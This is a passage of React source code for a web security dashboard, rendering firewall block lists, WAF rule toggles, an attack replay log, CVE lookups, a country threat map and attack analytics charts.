                    transition={{ delay: i * 0.03 }}
                    style={{ padding: '10px 14px', borderRadius: 8, background: 'rgba(239,68,68,0.05)', border: '1px solid rgba(239,68,68,0.15)' }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                        <div style={{ fontSize: 16 }}>🚫</div>
                        <div>
                          <div style={{ fontSize: 12, fontFamily: 'monospace', color: '#ef4444', fontWeight: 700 }}>{ipAddr}</div>
                          <div style={{ fontSize: 9, color: 'var(--e-muted)', marginTop: 1 }}>{reason}</div>
                        </div>
                      </div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                        {lastSeen !== '--' && <span style={{ fontSize: 9, color: 'var(--e-muted)', fontFamily: 'monospace' }}>{lastSeen}</span>}
                        {isAutoBlocked && <span style={{ fontSize: 8, background: 'rgba(239,68,68,0.2)', color: '#ef4444', border: '1px solid rgba(239,68,68,0.3)', padding: '1px 6px', borderRadius: 10, letterSpacing: 1 }}>AUTO</span>}
                        <button
                          onClick={() => engine.unblockIP(ipAddr)}
                          style={{ padding: '4px 10px', fontSize: 10, borderRadius: 4, border: '1px solid rgba(255,255,255,0.1)', background: 'transparent', color: 'var(--e-muted)', cursor: 'pointer', transition: 'all 0.2s' }}
                        >Unblock</button>
                      </div>
                    </div>
                  </motion.div>
                );
              })}
            </div>
          </div>
        </div>

        {/* Right column */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
          {/* Firewall stats */}
          <div className="glass-card">
            <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 14, color: 'var(--e-muted)', letterSpacing: 1 }}>FIREWALL STATUS</div>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10 }}>
              {[
                { label: 'Total Blocked', value: blocked.length, color: '#ef4444' },
                { label: 'Auto-Blocked', value: blocked.filter(ip => log.filter(e => e.src_ip === ip).length >= 3).length, color: '#f97316' },
                { label: 'Block Rate', value: `${engine.getStats().blockRate || 0}%`, color: 'var(--e-green)' },
                { label: 'Active Rules', value: 4, color: 'var(--cyan)' },
              ].map((s, i) => (
                <div key={i} style={{ padding: '10px 14px', background: 'rgba(255,255,255,0.02)', borderRadius: 8, border: '1px solid rgba(255,255,255,0.04)' }}>
                  <div style={{ fontSize: 9, color: 'var(--e-muted)', letterSpacing: 2, textTransform: 'uppercase', marginBottom: 4 }}>{s.label}</div>
                  <div style={{ fontSize: 20, fontWeight: 800, color: s.color }}>{typeof s.value === 'number' && s.value > 0 ? <AnimatedNumber value={s.value} /> : s.value}</div>
                </div>
              ))}
            </div>
          </div>

          {/* Geo-block panel */}
          <PremiumLock featureName="Geographic Firewall" description="Block entire countries or regions from accessing your infrastructure in real-time.">
            <div className="glass-card">
              <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 14 }}>🌍 Geographic Firewall</div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
                {Object.entries(geoBlocked).map(([country, isBlocked]) => (
                  <div key={country} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 14px', background: isBlocked ? 'rgba(239,68,68,0.05)' : 'rgba(255,255,255,0.02)', borderRadius: 8, border: `1px solid ${isBlocked ? 'rgba(239,68,68,0.15)' : 'rgba(255,255,255,0.04)'}` }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                      <span style={{ fontSize: 18 }}>{GEO_FLAGS[country] || '🌐'}</span>
                      <span style={{ fontSize: 12, fontWeight: 600 }}>{country}</span>
                    </div>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                      {isBlocked && <span style={{ fontSize: 8, background: 'rgba(239,68,68,0.2)', color: '#ef4444', padding: '1px 6px', borderRadius: 10, letterSpacing: 1, fontWeight: 700 }}>BLOCKED</span>}
                      <button
                        onClick={() => isPremium && setGeoBlocked(prev => ({ ...prev, [country]: !isBlocked }))}
                        style={{
                          width: 36, height: 20, borderRadius: 10, border: 'none', cursor: isPremium ? 'pointer' : 'not-allowed',
                          background: isBlocked ? '#ef4444' : 'rgba(255,255,255,0.1)',
                          position: 'relative', transition: 'all 0.3s'
                        }}
                      >
                        <div style={{ position: 'absolute', width: 14, height: 14, borderRadius: '50%', background: 'white', top: 3, left: isBlocked ? 19 : 3, transition: 'left 0.3s' }} />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </PremiumLock>

          {/* Quick rules */}
          <PremiumLock featureName="Custom WAF Rules" description="Deploy custom regex-based Layer 7 filters to the edge WAF.">
            <div className="glass-card">
              <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 14 }}>⚡ Quick WAF Rules</div>
              {[
                { name: 'Block Tor Exit Nodes', active: true },
                { name: 'Block Known Botnets', active: true },
                { name: 'Block VPN Anonymizers', active: false },
              ].map(rule => (
                <div key={rule.name} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '8px 0', borderBottom: '1px solid rgba(255,255,255,0.04)' }}>
                  <span style={{ fontSize: 11, color: rule.active ? 'white' : 'var(--e-muted)' }}>{rule.name}</span>
                  <span style={{ fontSize: 9, color: rule.active ? 'var(--e-green)' : 'var(--e-muted)', fontWeight: 700 }}>{rule.active ? 'ACTIVE' : 'OFF'}</span>
                </div>
              ))}
            </div>
          </PremiumLock>
        </div>
      </div>
    </MotionDiv>
  );
}

function ReplayTab({ log }) {
  const [filter, setFilter] = useState('ALL');
  const [searchQ, setSearchQ] = useState('');
  const [expandedId, setExpandedId] = useState(null);
  const [isReplay, setIsReplay] = useState(false);

  const typeColors = { SQLi: '#f97316', XSS: '#a855f7', LFI: '#38bdf8', CMDi: '#ef4444', DDoS: '#fbbf24' };
  const sevColors = { CRITICAL: '#ef4444', HIGH: '#f97316', MEDIUM: '#eab308', LOW: '#22c55e' };

  const filtered = log.filter(ev => {
    const matchType = filter === 'ALL' || ev.attack_type === filter || (filter === 'BLOCKED' && ev.action === 'BLOCKED');
    const q = searchQ.toLowerCase();
    const matchSearch = !q || (ev.src_ip || '').includes(q) || (ev.attack_type || '').toLowerCase().includes(q) || (ev.payload || '').toLowerCase().includes(q);
    return matchType && matchSearch;
  });

  return (
    <MotionDiv initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}>
      <div style={{ marginBottom: 24 }}>
        <h1 style={{ fontFamily: 'Anton', fontSize: 36, margin: 0, textTransform: 'uppercase', letterSpacing: '-0.02em' }}>⏪ Attack Replay</h1>
        <p style={{ color: 'var(--e-muted)', fontFamily: 'monospace', marginTop: 4 }}>Forensic event timeline — {log.length} events recorded</p>
      </div>

      {/* Controls */}
      <div style={{ display: 'flex', gap: 12, marginBottom: 20, flexWrap: 'wrap', alignItems: 'center' }}>
        <input
          className="input"
          placeholder="🔍 Search IP, payload, attack type..."
          value={searchQ}
          onChange={e => setSearchQ(e.target.value)}
          style={{ flex: 1, minWidth: 220, height: 38, fontSize: 12 }}
        />
        <div style={{ display: 'flex', gap: 6 }}>
          {['ALL', 'BLOCKED', 'SQLi', 'XSS', 'LFI', 'CMDi', 'DDoS'].map(f => (
            <button
              key={f}
              onClick={() => setFilter(f)}
              style={{
                padding: '6px 12px', fontSize: 10, fontWeight: 700, borderRadius: 4, letterSpacing: 1, cursor: 'pointer', border: 'none',
                background: filter === f ? (f === 'BLOCKED' ? '#22c55e' : f === 'ALL' ? 'var(--e-green)' : (typeColors[f] || '#fff')) : 'rgba(255,255,255,0.05)',
                color: filter === f ? '#000' : 'var(--e-muted)',
                transition: 'all 0.2s'
              }}
            >{f}</button>
          ))}
        </div>
        <button
          onClick={() => setIsReplay(!isReplay)}
          style={{ padding: '6px 14px', fontSize: 10, fontWeight: 700, borderRadius: 4, letterSpacing: 1, cursor: 'pointer', border: '1px solid rgba(255,255,255,0.15)', background: isReplay ? 'rgba(0,255,136,0.1)' : 'transparent', color: isReplay ? 'var(--e-green)' : 'var(--e-muted)', transition: 'all 0.2s' }}
        >{isReplay ? '⏸ PAUSE' : '▶ REPLAY MODE'}</button>
      </div>

      {/* Event Feed */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: 8, maxHeight: 520, overflowY: 'auto', paddingRight: 4 }}>
        {filtered.length === 0 && (
          <div className="feed-empty">{log.length === 0 ? 'No events — run a simulation burst first' : 'No events match your filter'}</div>
        )}
        {filtered.slice(0, 80).map((ev, i) => {
          const tc = typeColors[ev.attack_type] || '#94a3b8';
          const sc = sevColors[ev.severity] || 'var(--e-muted)';
          const isExpanded = expandedId === ev.id;
          const cve = engine.getCVE(ev.attack_type) || {};
          return (
            <motion.div
              key={ev.id || i}
              initial={isReplay ? { opacity: 0, x: -20 } : { opacity: 1 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: isReplay ? i * 0.04 : 0 }}
              onClick={() => setExpandedId(isExpanded ? null : ev.id)}
              style={{
                padding: '12px 16px',
                background: isExpanded ? `${tc}0d` : 'rgba(255,255,255,0.02)',
                border: `1px solid ${isExpanded ? tc + '44' : 'rgba(255,255,255,0.04)'}`,
                borderLeft: `3px solid ${tc}`,
                borderRadius: 8,
                cursor: 'pointer',
                transition: 'all 0.2s'
              }}
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: 12, flexWrap: 'wrap' }}>
                <span style={{ fontSize: 9, color: 'var(--e-muted)', fontFamily: 'monospace', whiteSpace: 'nowrap' }}>{String(ev.timestamp || '').slice(11, 19) || '--:--:--'}</span>
                <span style={{ fontSize: 10, background: `${sc}20`, color: sc, border: `1px solid ${sc}44`, padding: '1px 7px', borderRadius: 10, fontWeight: 700, letterSpacing: 1 }}>{ev.severity || 'UNK'}</span>
                <span style={{ fontSize: 11, color: tc, fontWeight: 700 }}>{ev.attack_type}</span>
                <span style={{ fontSize: 11, color: 'white', fontFamily: 'monospace' }}>{ev.src_ip}</span>
                <span style={{ flex: 1, fontSize: 10, color: 'var(--e-muted)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', fontFamily: 'monospace' }}>{ev.payload || 'No payload'}</span>
                <span style={{ fontSize: 10, fontWeight: 700, color: ev.action === 'BLOCKED' ? '#22c55e' : '#eab308' }}>{ev.action === 'BLOCKED' ? '🛡️ BLOCKED' : '⚠️ DETECTED'}</span>
              </div>
              {isExpanded && (
                <motion.div initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: 'auto' }} style={{ marginTop: 14, paddingTop: 14, borderTop: `1px solid ${tc}22` }}>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 16, marginBottom: 12 }}>
                    <div><div style={{ fontSize: 9, color: 'var(--e-muted)', marginBottom: 4 }}>FULL PAYLOAD</div><div style={{ fontSize: 11, fontFamily: 'monospace', color: tc, padding: '6px 10px', background: 'rgba(0,0,0,0.3)', borderRadius: 4 }}>{ev.payload || 'N/A'}</div></div>
                    <div><div style={{ fontSize: 9, color: 'var(--e-muted)', marginBottom: 4 }}>GEOLOCATION</div><div style={{ fontSize: 12, color: 'white' }}>{ev.city || '?'}, {ev.country || '?'}</div></div>
                    <div><div style={{ fontSize: 9, color: 'var(--e-muted)', marginBottom: 4 }}>CVE REFERENCE</div><div style={{ fontSize: 11, fontFamily: 'monospace', color: '#ef4444' }}>{cve.cve_id || 'N/A'}</div></div>
                  </div>
                  {cve.desc && <div style={{ fontSize: 11, color: 'var(--e-muted)', lineHeight: 1.5, background: 'rgba(0,0,0,0.2)', padding: '8px 12px', borderRadius: 6 }}>{cve.desc}</div>}
                </motion.div>
              )}
            </motion.div>
          );
        })}
      </div>
    </MotionDiv>
  );
}

function ThreatIntelTab() {
  const [type, setType] = useState('SQLi');
  const [search, setSearch] = useState('');
  const [dynamicCve, setDynamicCve] = useState(null);
  const [searchError, setSearchError] = useState('');

  const cve = dynamicCve || engine.getCVE(type);
  const sc = cve.cvss >= 9 ? 'var(--red)' : cve.cvss >= 7 ? 'var(--orange)' : 'var(--cyan)';

  const handleSearch = () => {
    if (search.trim() === '') {
      setDynamicCve(null);
      setSearchError('');
    } else {
      const found = engine.lookupCVE(search);
      if (found) {
        setDynamicCve(found);
        setSearchError('');
      } else {
        setDynamicCve(null);
        setSearchError(`No threat intelligence entry found for "${search.trim()}".`);
      }
    }
  };

  return (
    <div className="dash-grid">
      <div className="glass-card">
        <div style={{ fontSize: 14, fontWeight: 700, marginBottom: 16 }}>🔍 CVE Intelligence Lookup</div>

        <div style={{ display: 'flex', gap: 10, marginBottom: 20 }}>
          <input className="input" placeholder="Search CVE-2024-XXXX or Keywords..." value={search} onChange={(e) => setSearch(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && handleSearch()} style={{ flex: 1 }} />
          <button className="evolve-btn" onClick={handleSearch}>Scan DB</button>
        </div>

        {searchError && (
          <div style={{ marginBottom: 14, fontSize: 11, color: 'var(--orange)', fontFamily: 'var(--mono)' }}>
            {searchError}
          </div>
        )}

        <div style={{ display: 'flex', gap: 8, marginBottom: 16 }}>
          {['SQLi', 'XSS', 'LFI', 'CMDi'].map((t) => <button key={t} className={`tab-btn ${type === t && !dynamicCve ? 'active' : ''}`} onClick={() => { setType(t); setDynamicCve(null); setSearch(''); setSearchError(''); }} style={{ padding: '6px 14px' }}>{t}</button>)}
        </div>

        <div style={{ background: 'rgba(8,11,16,.5)', borderLeft: `3px solid ${sc}`, border: `1px solid ${sc}44`, borderRadius: 10, padding: '16px 18px', transition: 'all 0.3s ease' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <div style={{ fontSize: 18, fontWeight: 800, color: sc, fontFamily: 'Anton', letterSpacing: '0.02em' }}>{cve.cve_id}</div>
            <div style={{ fontSize: 10, color: 'var(--muted)', fontFamily: 'var(--mono)' }}>Published: {cve.published || 'Unknown'}</div>
          </div>
          {cve.title && (
            <div style={{ marginTop: 8, fontSize: 12, color: 'var(--text)', fontWeight: 600 }}>
              {cve.title}
            </div>
          )}
          <div style={{ display: 'flex', alignItems: 'center', gap: 16, marginTop: 16 }}>
            <div><div style={{ fontSize: 32, fontWeight: 700, color: sc, fontFamily: 'var(--mono)' }}>{cve.cvss}</div><div style={{ fontSize: 9, color: 'var(--muted2)', fontFamily: 'var(--mono)' }}>CVSS SCORE</div></div>
            <span style={{ background: `${sc}18`, color: sc, border: `1px solid ${sc}44`, padding: '4px 12px', borderRadius: 4, fontSize: 11, fontFamily: 'var(--mono)', fontWeight: 700 }}>{cve.severity}</span>
          </div>
          <div style={{ fontSize: 13, color: 'var(--muted)', marginTop: 16, lineHeight: 1.6, padding: '12px', background: 'rgba(0,0,0,0.4)', borderRadius: '8px' }}>{cve.desc}</div>
        </div>
      </div>
      <div className="glass-card">
        <div style={{ fontSize: 14, fontWeight: 700, marginBottom: 16 }}>🇮🇳 CERT-In Advisories</div>
        {engine.getCERTAdvisories().slice(0, 5).map((a) => {
          const ac = { CRITICAL: 'var(--red)', HIGH: 'var(--orange)', MEDIUM: 'var(--yellow)' }[a.severity] || 'var(--muted)';
          return (
            <div key={a.id} style={{ background: 'rgba(8,11,16,.5)', borderLeft: `3px solid ${ac}`, border: '1px solid var(--line)', borderRadius: 8, padding: '10px 14px', marginBottom: 8 }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <span style={{ fontSize: 10, fontWeight: 700, color: ac, fontFamily: 'var(--mono)' }}>{a.id}</span>
                <span style={{ background: `${ac}18`, color: ac, border: `1px solid ${ac}44`, padding: '2px 8px', borderRadius: 4, fontSize: 9, fontFamily: 'var(--mono)' }}>{a.severity}</span>
              </div>
              <div style={{ fontSize: 11, color: 'var(--text2)', marginTop: 5 }}>{a.title}</div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

function MapTab({ stats }) {
  const countries = Object.entries(stats.byCountry || {}).sort((a, b) => b[1] - a[1]).slice(0, 10);
  const total = stats.total || 1;
  const COUNTRY_CODES = { 'China': '🇨🇳', 'Russia': '🇷🇺', 'USA': '🇺🇸', 'Germany': '🇩🇪', 'Brazil': '🇧🇷', 'India': '🇮🇳', 'Netherlands': '🇳🇱', 'France': '🇫🇷', 'UK': '🇬🇧', 'Canada': '🇨🇦', 'Japan': '🇯🇵', 'South Korea': '🇰🇷', 'Ukraine': '🇺🇦', 'Iran': '🇮🇷', 'Romania': '🇷🇴', 'Turkey': '🇹🇷' };
  const maxCount = countries[0]?.[1] || 1;

  return (
    <MotionDiv initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}>
      <div style={{ marginBottom: 24 }}>
        <h1 style={{ fontFamily: 'Anton', fontSize: 36, margin: 0, textTransform: 'uppercase', letterSpacing: '-0.02em' }}>🌐 Global Threat Map</h1>
        <p style={{ color: 'var(--e-muted)', fontFamily: 'monospace', marginTop: 4 }}>Real-time attack origin intelligence</p>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 20 }}>
        {/* Arc-style attack visualization */}
        <div className="glass-card">
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 20 }}>
            <div style={{ fontSize: 13, fontWeight: 700 }}>🎯 Attack Origin Ranking</div>
            <div style={{ fontSize: 10, color: 'var(--e-muted)' }}>{countries.length} COUNTRIES</div>
          </div>
          {countries.length === 0 ? (
            <div className="feed-empty">No geographic data — simulate attacks first</div>
          ) : (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
              {countries.map(([country, count], i) => {
                const pct = Math.round((count / total) * 100);
                const intensity = count / maxCount;
                const color = intensity > 0.7 ? '#ef4444' : intensity > 0.4 ? '#f97316' : intensity > 0.2 ? '#eab308' : '#22c55e';
                const flag = COUNTRY_CODES[country] || '🌐';
                return (
                  <div key={country} style={{ padding: '10px 14px', background: 'rgba(255,255,255,0.02)', borderRadius: 8, border: `1px solid ${color}22` }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 6 }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                        <span style={{ fontSize: 18 }}>{flag}</span>
                        <span style={{ fontSize: 12, fontWeight: 600, color: 'white' }}>{country}</span>
                        {i === 0 && <span style={{ fontSize: 8, background: '#ef444420', color: '#ef4444', border: '1px solid #ef444440', padding: '1px 6px', borderRadius: 10, letterSpacing: 1 }}>TOP THREAT</span>}
                      </div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                        <span style={{ fontSize: 11, color, fontFamily: 'monospace', fontWeight: 700 }}>{count}</span>
                        <span style={{ fontSize: 9, color: 'var(--e-muted)' }}>{pct}%</span>
                      </div>
                    </div>
                    <div style={{ height: 4, background: 'rgba(255,255,255,0.05)', borderRadius: 2, overflow: 'hidden' }}>
                      <motion.div
                        initial={{ width: 0 }}
                        animate={{ width: `${pct}%` }}
                        transition={{ duration: 0.8, delay: i * 0.05 }}
                        style={{ height: '100%', background: `linear-gradient(90deg, ${color}, ${color}88)`, boxShadow: `0 0 8px ${color}44` }}
                      />
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>

        {/* Global stats + animated arcs */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
          <div className="glass-card">
            <div style={{ fontSize: 13, fontWeight: 700, marginBottom: 16 }}>🌍 Threat Intelligence Summary</div>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
              {[
                { label: 'Unique Countries', value: countries.length, color: 'var(--cyan)' },
                { label: 'Most Active', value: countries[0]?.[0] || 'N/A', color: '#ef4444' },
                { label: 'Total Events', value: stats.total || 0, color: 'var(--e-green)' },
                { label: 'Geo-Coverage', value: `${Math.min(Math.round((countries.length / 195) * 100), 100)}%`, color: '#a855f7' },
              ].map((s, i) => (
                <div key={i} style={{ padding: 14, background: 'rgba(255,255,255,0.02)', borderRadius: 8, border: '1px solid rgba(255,255,255,0.04)' }}>
                  <div style={{ fontSize: 9, color: 'var(--e-muted)', letterSpacing: 2, textTransform: 'uppercase', marginBottom: 6 }}>{s.label}</div>
                  <div style={{ fontSize: 20, fontWeight: 800, color: s.color }}>{typeof s.value === 'number' ? <AnimatedNumber value={s.value} /> : s.value}</div>
                </div>
              ))}
            </div>
          </div>

          <div className="glass-card" style={{ flex: 1 }}>
            <div style={{ fontSize: 13, fontWeight: 700, marginBottom: 14 }}>⚡ Live Attack Arcs</div>
            <div style={{ position: 'relative', height: 180 }}>
              <svg width="100%" height="100%" viewBox="0 0 400 180">
                {/* Server target */}
                <circle cx="200" cy="160" r="8" fill="#00ff9c" style={{ filter: 'drop-shadow(0 0 8px #00ff9c)' }} />
                <text x="200" y="175" fill="#00ff9c" fontSize="8" textAnchor="middle" fontFamily="monospace">YOUR SERVER</text>
                {/* Animated attack arcs */}
                {countries.slice(0, 6).map(([country, count], i) => {
                  const sx = 30 + i * 60;
                  const sy = 20 + (i % 2) * 30;
                  const color = count > maxCount * 0.6 ? '#ef4444' : count > maxCount * 0.3 ? '#f97316' : '#eab308';
                  return (
                    <g key={country}>
                      <motion.path
                        d={`M ${sx} ${sy} Q ${(sx + 200) / 2} ${(sy + 160) / 2 - 40} 200 160`}
                        fill="none"
                        stroke={color}
                        strokeWidth="1.5"
                        opacity={0.6}
                        animate={{ pathLength: [0, 1, 0] }}
                        transition={{ duration: 2 + i * 0.4, repeat: Infinity, delay: i * 0.3, ease: 'easeInOut' }}
                        style={{ filter: `drop-shadow(0 0 3px ${color})` }}
                      />
                      <circle cx={sx} cy={sy} r="4" fill={color} opacity={0.8} style={{ filter: `drop-shadow(0 0 6px ${color})` }} />
                      <text x={sx} y={sy - 8} fill={color} fontSize="7" textAnchor="middle" fontFamily="monospace">{country.slice(0, 6)}</text>
                    </g>
                  );
                })}
              </svg>
            </div>
          </div>
        </div>
      </div>
    </MotionDiv>
  );
}

function AnalyticsTab({ stats }) {
  const log = engine.getRecentLog(200);
  const isPremium = engine.isPremium();

  // Hourly attack buckets from log (last 12 entries max)
  const hourlyData = (() => {
    const buckets = {};
    log.forEach(ev => {
      const h = String(ev.timestamp || '').slice(11, 13) || '??';
      if (!buckets[h]) buckets[h] = { total: 0, blocked: 0, SQLi: 0, XSS: 0, LFI: 0, CMDi: 0, DDoS: 0 };
      buckets[h].total++;
      if (ev.action === 'BLOCKED') buckets[h].blocked++;
      if (ev.attack_type) buckets[h][ev.attack_type] = (buckets[h][ev.attack_type] || 0) + 1;
    });
    return Object.entries(buckets).sort((a, b) => a[0].localeCompare(b[0])).slice(-12).map(([h, v]) => ({ h: `${h}:00`, ...v }));
  })();

  const maxTotal = Math.max(...hourlyData.map(d => d.total), 1);
  const attackTypes = ['SQLi', 'XSS', 'LFI', 'CMDi', 'DDoS'];
  const typeColors = { SQLi: '#f97316', XSS: '#a855f7', LFI: '#38bdf8', CMDi: '#ef4444', DDoS: '#fbbf24' };
  const totalAttacks = stats.total || 0;
  const countries = Object.entries(stats.byCountry || {}).sort((a, b) => b[1] - a[1]).slice(0, 8);

  return (
    <MotionDiv initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}>
      <div style={{ marginBottom: 32 }}>
        <h1 style={{ fontFamily: 'Anton', fontSize: 36, margin: 0, textTransform: 'uppercase', letterSpacing: '-0.02em' }}>📊 Security Analytics</h1>
        <p style={{ color: 'var(--e-muted)', fontFamily: 'monospace', marginTop: 4 }}>Real-time attack intelligence & trend analysis</p>
      </div>

      {/* Top stats row */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 16, marginBottom: 24 }}>
        {[
          { label: 'TOTAL THREATS', value: stats.total, color: 'var(--red)', icon: '🎯' },
          { label: 'MITIGATED', value: stats.blocked, color: 'var(--e-green)', icon: '🛡️' },
          { label: 'BLOCK RATE', value: `${stats.blockRate || 0}%`, color: 'var(--cyan)', icon: '📈' },
          { label: 'UNIQUE SOURCES', value: Object.keys(stats.byCountry || {}).length, color: '#a855f7', icon: '🌍' },
        ].map((s, i) => (
          <div key={i} className="glass-card" style={{ textAlign: 'center', padding: '20px 16px' }}>
            <div style={{ fontSize: 22, marginBottom: 6 }}>{s.icon}</div>
            <div style={{ fontSize: 28, fontWeight: 800, color: s.color, fontFamily: 'monospace' }}>{typeof s.value === 'number' ? <AnimatedNumber value={s.value} /> : s.value}</div>
            <div style={{ fontSize: 9, color: 'var(--e-muted)', marginTop: 4, letterSpacing: 2, textTransform: 'uppercase' }}>{s.label}</div>
          </div>
        ))}
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1.5fr 1fr', gap: 20, marginBottom: 20 }}>
        {/* Attack Timeline Chart */}
        <div className="glass-card">
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 20 }}>
            <div style={{ fontSize: 13, fontWeight: 700 }}>⚡ Attack Timeline</div>
            <div style={{ fontSize: 10, color: 'var(--e-muted)', fontFamily: 'monospace' }}>LAST 12 HOURS</div>
          </div>
          {hourlyData.length === 0 ? (
            <div className="feed-empty">No data — run a simulation to generate traffic</div>
          ) : (
            <div style={{ display: 'flex', alignItems: 'flex-end', gap: 6, height: 140 }}>
              {hourlyData.map((d, i) => (
                <div key={i} style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 4, height: '100%', justifyContent: 'flex-end' }}>
                  <motion.div
                    initial={{ height: 0 }}
                    animate={{ height: `${(d.total / maxTotal) * 100}%` }}
                    transition={{ duration: 0.8, delay: i * 0.04, ease: 'easeOut' }}
                    style={{ width: '100%', background: `linear-gradient(180deg, #ef4444, #f97316)`, borderRadius: '4px 4px 0 0', minHeight: 4, boxShadow: d.total > 0 ? '0 0 8px rgba(239,68,68,0.4)' : 'none' }}
                  />
                  <div style={{ fontSize: 8, color: 'var(--e-muted)', fontFamily: 'monospace', whiteSpace: 'nowrap', transform: 'rotate(-45deg)', marginTop: 2 }}>{d.h}</div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Attack Type Breakdown */}
        <div className="glass-card">
          <div style={{ fontSize: 13, fontWeight: 700, marginBottom: 20 }}>🎯 Attack Breakdown</div>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
            {attackTypes.map(t => {
              const count = stats.byType?.[t] || 0;
              const pct = totalAttacks ? Math.round((count / totalAttacks) * 100) : 0;
              return (
                <div key={t}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 5 }}>
                    <span style={{ fontSize: 11, color: typeColors[t], fontWeight: 700 }}>{t}</span>
                    <span style={{ fontSize: 11, color: 'var(--e-muted)', fontFamily: 'monospace' }}>{count} ({pct}%)</span>
                  </div>
                  <div style={{ height: 6, background: 'rgba(255,255,255,0.05)', borderRadius: 3, overflow: 'hidden' }}>
                    <motion.div
                      initial={{ width: 0 }}
                      animate={{ width: `${pct}%` }}
                      transition={{ duration: 1, ease: 'easeOut' }}
                      style={{ height: '100%', background: `linear-gradient(90deg, ${typeColors[t]}, ${typeColors[t]}88)`, boxShadow: `0 0 10px ${typeColors[t]}44` }}
                    />
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 20 }}>
        {/* Top Countries */}
        <div className="glass-card">
          <div style={{ fontSize: 13, fontWeight: 700, marginBottom: 20 }}>🌍 Top Attack Origins</div>
          {countries.length === 0 ? <div className="feed-empty">Simulate attacks to see origin data</div> : (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
              {countries.map(([country, count], i) => {
                const pct = Math.round((count / totalAttacks) * 100);
                const colors = ['#ef4444', '#f97316', '#eab308', '#22c55e', '#38bdf8', '#a855f7', '#ec4899', '#14b8a6'];
                return (
                  <div key={country}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 4 }}>
                      <span style={{ fontSize: 11, color: 'white' }}>{country}</span>
                      <span style={{ fontSize: 11, color: colors[i % 8], fontFamily: 'monospace' }}>{count} ({pct}%)</span>
                    </div>
                    <div style={{ height: 5, background: 'rgba(255,255,255,0.05)', borderRadius: 3, overflow: 'hidden' }}>
                      <motion.div initial={{ width: 0 }} animate={{ width: `${pct}%` }} transition={{ duration: 0.8, delay: i * 0.06 }} style={{ height: '100%', background: colors[i % 8], opacity: 0.85 }} />
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>

        {/* Severity distribution */}
        <PremiumLock featureName="Advanced Severity Analytics" description="Risk scoring, CVE mapping, and severity trend analysis available on Enterprise.">
          <div className="glass-card">
            <div style={{ fontSize: 13, fontWeight: 700, marginBottom: 20 }}>⚠️ Severity Distribution</div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
              {['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'].map(sev => {
                const sevColors = { CRITICAL: '#ef4444', HIGH: '#f97316', MEDIUM: '#eab308', LOW: '#22c55e' };
                const count = log.filter(e => e.severity === sev).length;
                const pct = log.length ? Math.round((count / log.length) * 100) : 0;
                return (
                  <div key={sev}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 4 }}>
                      <span style={{ fontSize: 10, color: sevColors[sev], fontWeight: 700, letterSpacing: 1 }}>{sev}</span>
                      <span style={{ fontSize: 11, color: 'var(--e-muted)', fontFamily: 'monospace' }}>{count}</span>
                    </div>
                    <div style={{ height: 6, background: 'rgba(255,255,255,0.05)', borderRadius: 3, overflow: 'hidden' }}>
                      <motion.div initial={{ width: 0 }} animate={{ width: `${pct}%` }} transition={{ duration: 0.9 }} style={{ height: '100%', background: sevColors[sev], opacity: 0.8 }} />
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </PremiumLock>
      </div>
    </MotionDiv>
  );
}

function ReportsTab({ stats, blocked }) {
